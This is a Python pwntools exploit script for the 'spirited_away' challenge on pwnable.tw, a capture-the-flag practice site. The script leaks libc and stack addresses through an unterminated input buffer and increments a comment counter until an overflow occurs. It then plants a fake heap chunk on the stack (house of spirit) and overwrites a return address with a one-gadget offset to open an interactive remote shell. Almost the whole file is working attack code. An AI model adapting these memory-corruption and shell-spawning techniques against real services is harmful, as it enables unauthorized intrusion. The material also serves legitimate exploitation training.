#!/usr/bin/env python
from pwn import *

addr = "chall.pwnable.tw"
port = 10204
binary = "./spirited_away"

libc = ELF("./libc_32.so.6")
system_offset = libc.symbols['system']

s = remote(addr, port)

def init():
    sleep(0.3)
    print s.recvuntil("Thanks for watching Spirited Away!")
    print s.recvuntil("Please leave some comments to help us improve our next movie!")

def Libcleak():
    sleep(0.3)
    print s.recvuntil("Reason: " + "AAAA"*6)
    libc_base = u32(s.recv(4))
    log.info("libc_base : %x" % libc_base)
    libc_base = libc_base - 0x675e7
    return libc_base

def Stackleak():
    sleep(0.3)
    print s.recvuntil("Reason: " + "A"*0x50)
    ebp = u32(s.recv(4)) - 0x20
    return ebp

def Continue(_choice):
    print "In Continue!!"
    sleep(0.05)
    print s.recvuntil("Would you like to leave another comment? <y/n>: ")
    s.send(_choice)

def Read(_name, _age, _reason, _comment):
    print s.recvuntil("\nPlease enter your name: ")
    s.send(_name)

    print s.recvuntil("Please enter your age: ")
    s.sendline(_age)

    print s.recvuntil("Why did you came to see this movie? ")
    s.send(_reason)

    print s.recvuntil("Please enter your comment: ")
    s.send(_comment)

def Read2(_age, _reason):
    print s.recvuntil("Please enter your age: ")
    s.sendline(_age)

    print s.recvuntil("Why did you came to see this movie? ")
    s.send(_reason)

def Display():
    print "In Display!!"
    print s.recvuntil("Name: ")
    print s.recvuntil("Comment:")
    print s.recvuntil("comment so far. We will review them as soon as we can")


init()

Read("smlee","1","AAAA"*6, "1")
libc_base = Libcleak()
Continue("y")

Read("smlee","1","A"*0x50, "2")
ebp = Stackleak()
Continue("y")

system_libc = libc_base + system_offset
binsh = libc_base + 0x158e8b
one_shot = libc_base + 0x3a819

log.info("libc_base : %x" % libc_base)
log.info("system_libc : %x" % system_libc)
log.info("/bin/sh Address : %x" % binsh)
log.info("one_shot : %x" % one_shot)
log.info("EBP Address : %x" % ebp)

for i in range(0, 8):
    sleep(0.3)
    Read("smlee","1","AAAA\x00", "BBBB")
    Display()
    Continue("y")


for i in range(0, 90):
    Read2("1","2")
    Continue("y")


fake_chunk = p32(0x0)
fake_chunk += p32(0x41)
fake_chunk += "AAAA"*14

fake_chunk += p32(0x0)
fake_chunk += p32(0x41)

reason_addr = ebp-0x50
Read("smlee", "27", fake_chunk, "A"*0x50+"BBBB"+p32(reason_addr + 0x8))
Continue("y")


reason = "A"*(0x50 - 0x8)
reason += "BBBB"
reason += p32(one_shot)

Read(reason, "1", "AAAA", "BBBB")
Continue("n")

s.interactive()
s.close()
